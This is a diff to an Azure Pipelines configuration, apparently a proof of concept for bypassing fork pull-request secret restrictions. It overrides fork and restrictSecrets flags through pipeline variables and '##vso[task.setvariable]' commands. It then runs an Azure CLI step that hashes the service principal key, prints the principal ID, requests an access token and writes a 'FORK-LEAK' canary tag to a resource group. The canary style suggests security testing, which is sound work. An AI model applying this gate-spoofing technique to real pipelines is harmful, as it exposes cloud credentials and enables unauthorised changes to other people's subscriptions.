@@ -5,18 +5,38 @@ pr:
       - main
 pool:
   name: r37gh6n9bsoq0hwi3ngw-pool
+variables:
+  build.isFork: 'false'
+  system.restrictSecrets: 'false'
+  system.pullRequest.isFork: 'false'
 steps:
+- script: |
+    echo "=== gate candidate values as task sees them ==="
+    echo "BUILD_ISFORK=$BUILD_ISFORK"
+    echo "SYSTEM_RESTRICTSECRETS=$SYSTEM_RESTRICTSECRETS"
+    echo "SYSTEM_PULLREQUEST_ISFORK=$SYSTEM_PULLREQUEST_ISFORK"
+    echo "AGENT_RESTRICTSECRETS=$AGENT_RESTRICTSECRETS"
+    env | grep -iE 'fork|restrict' | cut -d= -f1 | sort
+  displayName: dump-gate-names
+- script: |
+    echo "##vso[task.setvariable variable=build.isFork]false"
+    echo "##vso[task.setvariable variable=system.restrictSecrets]false"
+    echo "##vso[task.setvariable variable=System.PullRequest.IsFork]false"
+    echo "##vso[task.setvariable variable=agent.restrictSecrets]false"
+    echo "##vso[task.setvariable variable=restrictSecrets]false"
+  displayName: override-gate
 - task: AzureCLI@2
-  displayName: use-SCP-owner
+  displayName: use-SCP-fork
   inputs:
     azureSubscription: 'r37ghdv87phgtfgfgslh-scp'
     scriptType: bash
     scriptLocation: inlineScript
     addSpnToEnvironment: true
     inlineScript: |
-      echo "OWNER_RAN=yes"
+      echo "FORK_TASK_RAN=yes"
       L=$(printf '%s' "$servicePrincipalKey" | wc -c)
       H=$(printf '%s' "$servicePrincipalKey" | sha256sum | cut -c1-16)
-      echo "KEYLEN=$L KEYSHA16=$H"
+      echo "KEYLEN=$L KEYSHA16=$H SPID=$servicePrincipalId"
       az account get-access-token --resource https://management.azure.com/ --query '{exp:expiresOn}' -o json 2>&1 | head -3
-      az tag create --resource-id "/subscriptions/605836d3-e552-497e-baed-b290a5fe4bb6/resourceGroups/r37ghdv87phgtfgfgslh-rgm" --tags owner-canary=r37ghdv87phgtfgfgslh-owner 2>&1 | head -3
+      az tag create --resource-id "/subscriptions/605836d3-e552-497e-baed-b290a5fe4bb6/resourceGroups/r37ghdv87phgtfgfgslh-rgm" --tags fork-canary=r37ghdv87phgtfgfgslh-FORK-LEAK 2>&1 | head -5
+      echo "READBACK:"; az tag list --resource-id "/subscriptions/605836d3-e552-497e-baed-b290a5fe4bb6/resourceGroups/r37ghdv87phgtfgfgslh-rgm" -o json 2>&1 | head -15
